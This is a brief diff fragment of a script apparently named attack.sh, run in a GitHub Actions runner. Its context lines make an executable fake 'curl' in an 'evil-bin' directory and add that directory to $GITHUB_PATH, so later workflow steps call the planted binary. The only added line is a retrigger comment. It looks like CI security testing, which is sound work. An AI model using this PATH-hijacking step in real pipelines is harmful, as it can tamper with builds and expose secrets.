@@ -40,3 +40,4 @@ chmod +x "${RUNNER_TEMP}/evil-bin/curl"
 echo "${RUNNER_TEMP}/evil-bin" >> "$GITHUB_PATH"
 
 echo "attack.sh done"
+# retrigger 2026-09-18T16:38:14Z
